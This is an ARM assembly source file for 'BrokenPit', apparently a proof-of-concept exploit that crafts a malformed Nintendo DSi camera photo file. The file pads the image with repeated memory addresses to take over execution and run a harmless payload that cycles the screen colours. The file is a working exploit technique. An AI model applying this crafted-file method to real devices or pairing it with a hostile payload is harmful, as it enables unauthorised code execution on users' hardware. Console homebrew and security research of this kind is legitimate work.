@ BrokenPit - Nintendo DSi Camera Exploit 
@ by ChampionLeake

.arm
.global _start
.section .init

_start:
.ascii "0TIP"	@ MAGIC
.ascii "00_1"	@ "UNKNOWN ("_1""00" LE, maybe number of first folder or max number of photos per folder)"

.byte 0xB8, 0x0B	@ Photo frame slot (0-3000)
.byte 0x01, 0x00	@ "Folder counter; hundreds' digit (?)" 2 bytes long

.org 0x0E
.byte 0x01	@ "Photo counter (i.e. : next photo's number will be ++photocounter)" 2 bytes long

.org 0x14
.hword 0x0	@ CRC16 of the whole file (This must be 0 in order to generate the checksum)
.hword 0x4000	@ Header size

.org 0x18
.byte 0x62, 0x6A, 0x70, 0x24	@ "Date (# seconds since Jan/1/2000)"; the next 8 bytes afterwards are unknown and most of the time 0x00

.org 0x24
.byte 0x01	@ "This seems to be a flag field for photo(s)"

@ Color splash payload
.org 0x2A30
red_screen:
mov r0, #0x04000000
mov r1, #0
str r1, [r0, #0x208]
str r1, [r0, #0x210]
ldr r2, [r0, #0x214]
str r2, [r0, #0x214]
mov r2, #(1<<16)
str r2, [r0]
str r1, [r0, #0x60]
str r1, [r0, #0x6C] @ MASTER_BRIGHT FIX by Normmatt
mov r0, #0x05000000
ldr r1, =((12 << 10) | (12 << 5) | 30)    @ RED
strh r1, [r0]
bl delay
b blue_screen	@ infinite loop
.pool

/* stuckpixel delay loop code */
delay:
ldr r0, =10000000 @ time to wait
loop:
subs r0, #1 @ subtract 1
bne loop @ jump back if not zero
bx lr @ return

blue_screen:
mov r0, #0x04000000
mov r1, #0
str r1, [r0, #0x208]
str r1, [r0, #0x210]
ldr r2, [r0, #0x214]
str r2, [r0, #0x214]
mov r2, #(1<<16)
str r2, [r0]
str r1, [r0, #0x60]
str r1, [r0, #0x6C] @ MASTER_BRIGHT FIX by Normmatt
mov r0, #0x05000000
ldr r1, =((30 << 10) | (19 << 5) | 12)   @ BLUE
strh r1, [r0]
bl delay
b green_screen	@ infinite loop
.pool

green_screen:
mov r0, #0x04000000
mov r1, #0
str r1, [r0, #0x208]
str r1, [r0, #0x210]
ldr r2, [r0, #0x214]
str r2, [r0, #0x214]
mov r2, #(1<<16)
str r2, [r0]
str r1, [r0, #0x60]
str r1, [r0, #0x6C] @ MASTER_BRIGHT FIX by Normmatt
mov r0, #0x05000000
ldr r1, =((25 << 10) | (8 << 5) | 11)    @ PURPLE
strh r1, [r0]
bl delay
b red_screen	@ infinite loop
.pool

.org 0x4000
.fill 0x1000, 4, 0x02329000
.fill 0xEE8, 4, 0x02320200

end: